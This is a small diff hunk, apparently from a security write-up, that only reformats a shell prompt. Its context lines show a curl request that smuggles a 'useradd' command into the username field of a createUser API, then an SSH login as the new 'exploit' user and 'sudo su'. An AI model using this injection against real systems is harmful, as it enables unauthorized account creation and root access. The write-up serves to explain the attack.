@@ -328,8 +328,7 @@ curl https://host/service/v1/createUser -k --data '{"username": ";useradd \"expl
 And now log in:
 
 ```
-X-C3LL@Kumonga ᐓ  ~ |
-ᐓ   ssh exploit@192.168.0.20
+X-C3LL@Kumonga:~|⇒  ssh exploit@192.168.0.20
 exploit@192.168.0.20's password:
 Could not chdir to home directory /home/exploit: No such file or directory
 $ sudo su
